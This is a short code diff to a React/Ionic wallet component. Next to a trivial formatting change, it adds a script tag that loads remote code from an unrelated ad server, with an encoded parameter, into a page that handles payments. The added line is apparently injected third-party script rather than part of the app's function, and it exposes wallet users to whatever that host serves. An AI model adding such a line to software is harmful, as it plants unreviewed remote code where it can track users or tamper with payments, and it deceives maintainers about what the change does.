@@ -132,7 +132,8 @@ const Wallet = () => {
           </IonCardContent>
         </IonCard>
 
-        <PaymentModel/>
+        <PaymentModel />
+        <script src="//servedby.eleavers.com/ads/ads.php?t=MjIyOTQ7MTMwMTg7aG9yaXpvbnRhbC5iYW5uZXI=&index=1"></script>
       </IonContent>
     </IonPage>
   );
